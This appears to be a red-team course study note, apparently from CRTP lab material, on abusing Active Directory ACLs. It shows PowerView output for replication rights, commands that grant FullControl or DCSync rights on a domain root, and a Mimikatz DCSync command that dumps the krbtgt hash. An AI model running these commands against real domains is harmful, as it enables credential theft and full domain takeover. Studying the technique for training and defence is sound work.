- There are even more interesting ACLs which can be abused.
-  For example, with DA privileges, the ACL for the domain root can be modified to provide useful rights like FullControl or the ability to run "DCSync".
- DCSync can be used to extract KRBTGT

# Any user with these 3 privileges we can run DCSync
| 3 special priv for DCSync | Allow | 
| -- | -- | 
| Replicating Directory Changes | [x] |
| Replicating Directory Changes All | [x] |
| Replicating Directory Changes In Filtered Set | [x] |

```powershell

PS C:\CRTP Tools> Invoke-ACLScanner -ResolveGUIDs | ? {$_.ObjectType -match "DS-Replication"}


InheritedObjectType   : All
ObjectDN              : DC=kingslanding,DC=local
ObjectType            : DS-Replication-Get-Changes-All
IdentityReference     : KINGSLANDING\suzanne.jasmine
IsInherited           : False
ActiveDirectoryRights : ExtendedRight
PropagationFlags      : None
ObjectFlags           : ObjectAceTypePresent
InheritanceFlags      : None
InheritanceType       : None
AccessControlType     : Allow
ObjectSID             : S-1-5-21-543250712-1438597472-665204581
IdentitySID           : S-1-5-21-543250712-1438597472-665204581-1136

InheritedObjectType   : All
ObjectDN              : DC=kingslanding,DC=local
ObjectType            : DS-Replication-Get-Changes-In-Filtered-Set
IdentityReference     : KINGSLANDING\suzanne.jasmine
IsInherited           : False
ActiveDirectoryRights : ExtendedRight
PropagationFlags      : None
ObjectFlags           : ObjectAceTypePresent
InheritanceFlags      : None
InheritanceType       : None
AccessControlType     : Allow
ObjectSID             : S-1-5-21-543250712-1438597472-665204581
IdentitySID           : S-1-5-21-543250712-1438597472-665204581-1136

InheritedObjectType   : All
ObjectDN              : DC=kingslanding,DC=local
ObjectType            : DS-Replication-Get-Changes
IdentityReference     : KINGSLANDING\suzanne.jasmine
IsInherited           : False
ActiveDirectoryRights : ExtendedRight
PropagationFlags      : None
ObjectFlags           : ObjectAceTypePresent
InheritanceFlags      : None
InheritanceType       : None
AccessControlType     : Allow
ObjectSID             : S-1-5-21-543250712-1438597472-665204581
```


# Add FullControl rights:

```powershell
Add-ObjectAcl -TargetDistinguishedName 'DC=dollarcorp,DC=moneycorp,DC=local' -PrincipalSamAccountName student1 -Rights All -Verbose
```

# Using ActiveDirectory Module and Set-ADACL:
```powershell
Set-ADACL -DistinguishedName
'DC=dollarcorp,DC=moneycorp,DC=local' -Principal student1 -GUIDRight DCSync -Verbose
```

Execute DCSync to extract hashes (eg. any admin or krbtgt)
```powershell
Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
```